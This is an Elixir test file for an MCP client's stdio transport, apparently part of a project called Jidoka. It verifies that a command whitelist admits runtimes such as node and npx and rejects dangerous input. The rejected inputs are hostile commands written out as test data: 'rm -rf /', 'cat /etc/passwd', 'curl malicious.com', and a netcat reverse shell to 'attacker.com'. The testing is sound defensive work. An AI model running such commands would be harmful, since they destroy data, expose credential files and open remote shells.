defmodule Jidoka.Protocol.MCP.Transport.StdioTest do
  use ExUnit.Case, async: true

  alias Jidoka.Protocol.MCP.Transport.Stdio

  describe "command_whitelist/0" do
    test "returns default whitelist" do
      whitelist = Stdio.command_whitelist()

      # Check for common MCP server runtimes
      assert "node" in whitelist
      assert "npx" in whitelist
      assert "python" in whitelist
      assert "python3" in whitelist
      assert "uvx" in whitelist
      assert "uv" in whitelist
      assert "bun" in whitelist
      assert "deno" in whitelist
      assert "docker" in whitelist
    end

    test "includes configured whitelist" do
      # Configure custom whitelist
      Application.put_env(:jidoka, :mcp_allowed_commands, ["my-custom-server"])

      whitelist = Stdio.command_whitelist()

      assert "my-custom-server" in whitelist
      assert "node" in whitelist  # Default still present

      # Clean up
      Application.delete_env(:jidoka, :mcp_allowed_commands)
    end
  end

  describe "command_whitelisted?/1" do
    test "returns true for whitelisted commands" do
      assert Stdio.command_whitelisted?("npx mcp-server")
      assert Stdio.command_whitelisted?("node server.js")
      assert Stdio.command_whitelisted?("python3 server.py")
      assert Stdio.command_whitelisted?("uvx mcp-server")
    end

    test "returns false for non-whitelisted commands" do
      refute Stdio.command_whitelisted?("rm -rf /")
      refute Stdio.command_whitelisted?("curl malicious.com")
      refute Stdio.command_whitelisted?("wget malicious.com")
    end

    test "extracts base command name correctly" do
      # Full paths should work as long as basename is whitelisted
      assert Stdio.command_whitelisted?("/usr/local/bin/node server.js")
      assert Stdio.command_whitelisted?("./node server.js")

      # Basename check
      refute Stdio.command_whitelisted?("/usr/local/bin/rm -rf /")
    end
  end

  describe "connect/1" do
    test "rejects non-whitelisted commands" do
      assert {:error, {:command_not_whitelisted, "rm"}} =
               Stdio.connect(command: "rm -rf /")
    end

    test "rejects dangerous commands" do
      dangerous_commands = [
        "rm -rf /",
        "cat /etc/passwd",
        "sh -c 'curl malicious.com'",
        "bash -i",
        "nc -e /bin/sh attacker.com 4444"
      ]

      for cmd <- dangerous_commands do
        assert {:error, {:command_not_whitelisted, _}} =
                 Stdio.connect(command: cmd),
                 "Expected command to be rejected: #{cmd}"
      end
    end

    test "accepts whitelisted commands" do
      # Non-whitelisted command is rejected
      assert {:error, {:command_not_whitelisted, _}} =
               Stdio.connect(command: "nonexistent-command")

      # Valid whitelisted command passes whitelist check
      # (will fail at Port.open with a different error, not :command_not_whitelisted)
      refute match?({:error, {:command_not_whitelisted, _}}, Stdio.connect(command: "npx mcp-server"))
    end
  end

  describe "security validation" do
    test "empty command is rejected" do
      assert {:error, {:command_not_whitelisted, _}} =
               Stdio.connect(command: "")
    end

    test "whitespace-only command is rejected" do
      assert {:error, {:command_not_whitelisted, _}} =
               Stdio.connect(command: "   ")
    end

    test "command with leading/trailing spaces is validated correctly" do
      # Command with spaces is trimmed before validation
      # "npx" is whitelisted, so this should pass the whitelist check
      refute match?({:error, {:command_not_whitelisted, _}}, Stdio.connect(command: "  npx mcp-server  "))
    end
  end
end
